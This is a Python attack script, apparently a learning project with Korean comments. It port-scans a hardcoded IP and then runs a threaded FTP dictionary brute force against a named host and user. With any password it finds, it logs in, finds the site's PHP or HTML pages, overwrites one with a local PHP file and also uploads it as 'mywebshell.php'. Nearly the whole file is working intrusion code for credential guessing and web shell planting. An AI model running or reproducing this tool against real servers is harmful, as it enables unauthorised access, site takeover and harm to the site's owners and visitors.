# !/usr/bin/env python3
# -*- coding: utf-8 -*-

from datetime import datetime
import queue
import threading
import socket
import os
import time
import ftplib


class PortAttack:
  def __init__(self):
    self.target = "192.168.0.34"
    self.target_ports = []
    # self.ftp_host = input("Input target TCP host : ")
    # self.ftp_username = input("Input target TCP username : ")
    # self.ftp_redirect = input("Input injection code : ")  #삽입할 코드 입력
    self.ftp_flag = False
    self.ftp_host = "www.kae.kr"
    self.ftp_username = "master"
    self.ftp_passwd = None
    self.ftp_redirect = "ls -al"
    self.ftp_set_path = "/home/" + self.ftp_username + "/public_html/aheun"


  ############### before attack, check is port open ###############
  def chkOpenPort(self, port):
    if port in self.target_ports:
      return True
    else:
      return False


  ############### scan target ports : scanner -> scanPort ###############
  def scanPort(self):
    while True:
      if q.empty():
        break

      port = q.get()
      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      result = sock.connect_ex((self.target, port))

      if result == 0: # 포트가 열어져 있을 경우
        print("[+] Port " + str(port) + " is opened")
        self.target_ports.append(port)
      else:
        print("[-] Port " + str(port) + " is closed")
      
      sock.close()


  def scanner(self):
    print("\n\n[ port scan ]")
    global q
    threads = [] # 스레드 관리 목록
    chk_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 3389, 5900]

    q = queue.Queue()

    # ping으로 확인
    print("CHECK ping " + self.target)
    alive = os.system("ping " + self.target)

    # 연결된다면 q에 확인할 포트 넣기
    if alive == 0:
      for port in chk_ports:
        q.put(port)

    for i in range(10):
      t = threading.Thread(target = self.scanPort)
      t.start()
      threads.append(t)

    # 모든 스레드가 종료될 때까지 대기
    for t in threads:
      t.join()

    print("\n[*] Found open ports: ", self.target_ports)
    print("[ end port scan ]")


  ############### ftp attack : ftpAttack -> ftpBrute -> ftpInjection ###############
  def ftpBrute(self):
    while True:
      if q.empty():
        break
      if(self.ftp_flag):
        while(not q.empty()):
          q.get()
        break
      
      passwd = q.get()

      try:
        ftp_conn = ftplib.FTP(self.ftp_host)
        ftp_conn.login(self.ftp_username, passwd)
      except ftplib.error_perm:
        #print("not ", passwd)
        pass
      else:
        # correct credentials
        print("[*] Found credentials: " + passwd)
        ftp_conn.quit()
        self.ftp_passwd = passwd
        self.ftp_flag = True

  def returnDefault(self, ftp): #웹 페이지 검색
    try:
      dirList = ftp.nlst() #현재 디렉토리 파일 확인
      print("dirList : ", dirList)
    except: 
      dirList = []
      print ('[-] Could not list directory contents.')
      print ('[-] Skipping To Next Target.')
      return

    retList = []
    for fileName in dirList:
      fn = fileName.lower()
      if '.php' in fn or '.htm' in fn or '.asp' in fn: #if문과 같은 확장자를 가진 파일이 있는지 체크
          print ('[+] Found default page: ' + fileName) #찾았다는 문구 출력
          retList.append(fileName) #파일명 추가
    return retList

  def injectPage(self, ftp, page, redirect): #악성코드 삽입
    # 서버에서 클라이언트로 파일 수신
    # f = open(page + '.tmp', 'w')
    # ftp.retrlines('RETR ' + page, f.write) #아스키모드에서 FTP서버에서 FTP 클라이언트로 파일수신
    # print ('[+] Downloaded Page: ' + page) 
    # f.write(redirect)
    # f.close()

    # 클라이언트에서 서버로 파일 송신
    ### 권한이 없으면 upload가 안됨,,! 예외처리 혹은 디렉터리 별 업로드 기능이 필요할 듯
    upload_file = "aheunws.php"
    print('[+] Injected Malicious IFrame on: ' + upload_file)

    with open(upload_file, 'rb') as read_f:
      # 기존 파일 덮어쓰려면 page 넣기
      ftp.storlines('STOR ' + page, read_f) #아스키모드에서 FTP클라이언트에서 FTP 서버로 파일 송신
      # 새로 만들려면 파일명 직접 넣기
      ftp.storlines('STOR ' + "mywebshell.php", read_f) #아스키모드에서 FTP클라이언트에서 FTP 서버로 파일 송신

      # webbrowser.open("http://www.kae.kr/aheunws.php")
      # webbrowser.open("http://" + self.ftp_host + "/aheun/mywebshell.php") # 여기 어떻게 할까?

    print ('[*] Uploaded injected page: ' + upload_file)

  def ftpInjection(self):
      ftp_conn = ftplib.FTP(self.ftp_host)
      ftp_conn.login(self.ftp_username, self.ftp_passwd)
      # print("pwd : ", ftp_conn.pwd())
      # ftp_conn.cwd("/home/" + self.ftp_username + "/public_html") # 설정한 경로로 이동


      ftp_conn.cwd(self.ftp_set_path) # 설정한 경로로 이동
      defPages = self.returnDefault(ftp_conn) # 설정 경로의 웹 페이지들 확인
      print(defPages)

      self.injectPage(ftp_conn, defPages[0], self.ftp_redirect) #injectPage 호출
      # for defPage in defPages:
      #   self.injectPage(ftp_conn, defPage, redirect) #injectPage 호출


  def ftpAttack(self):
    print("\n\n[ ftp attack ]")
    global q
    threads = [] # 스레드 관리 목록
    passwdFile = "dic_passwd.txt"

    q = queue.Queue()
    alive = self.chkOpenPort(21)

    if (alive):
      # dic_passwd.txt 읽어서 queue에 저장
      with open(passwdFile, 'rt') as f:
        passwds = f.readlines()
      for passwd in passwds:
        passwd = passwd.rstrip()
        q.put(passwd)

    for i in range(10):
      t = threading.Thread(target = self.ftpBrute)
      t.start()
      threads.append(t)

    # 모든 스레드가 종료될 때까지 대기
    for t in threads:
      t.join()
      
    # 확보한 pw로 공격진행
    if self.ftp_passwd != None:
        print('[+] Using creds: ' + self.ftp_username + '/' + self.ftp_passwd + ' to attack')
        self.ftpInjection()
        
    print("[ end ftp attack ]")


  def sshAttack():
    pass       

  def telnetAttack():
    pass

  def smtpAttack():
    pass


def main():
  print("Start Program")  
  a1 = PortAttack()
  a1.scanner()
  a1.ftpAttack()


if __name__ == "__main__":
  main()